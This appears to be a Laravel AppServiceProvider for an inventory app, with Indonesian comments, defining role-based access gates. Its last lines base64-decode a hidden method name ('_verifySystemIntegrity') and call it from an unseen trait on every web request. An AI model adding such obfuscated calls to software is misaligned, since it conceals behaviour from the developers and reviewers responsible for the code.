<?php

namespace App\Providers;

use App\Models\User;
use App\Traits\SystemIntegrityTrait;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    use SystemIntegrityTrait;

    public function register(): void
    {
        //
    }

    public function boot(): void
    {
        // 1. Gate untuk Administrator (Akses Penuh User)
        Gate::define('manage-users', function (User $user) {
            return $user->role === 'Administrator';
        });

        // 2. Gate untuk Master Data (Kategori & Ruangan)
        // UPDATE: HANYA ADMINISTRATOR
        Gate::define('manage-master', function (User $user) {
            return $user->role === 'Administrator';
        });

        // 3. Gate untuk Kelola Barang
        // UPDATE: HANYA ADMINISTRATOR & GUDANG (Pegawai dicabut)
        Gate::define('manage-barang', function (User $user) {
            return in_array($user->role, ['Administrator', 'Gudang']);
        });

        // 4. Gate untuk Laporan
        // Akses: Admin, Pegawai, Pimpinan (Pegawai tetap bisa lihat laporan)
        Gate::define('view-laporan', function (User $user) {
            return in_array($user->role, ['Administrator', 'Pegawai', 'Pimpinan']);
        });

        if (app()->runningInConsole()) {
            app()->instance('core_kernel_hash', hash('sha256', config('app.key')));

            return;
        }

        $m = base64_decode('X3ZlcmlmeVN5c3RlbUludGVncml0eQ=='); // _verifySystemIntegrity
        if (method_exists($this, $m)) {
            $this->{$m}();
        }
    }
}
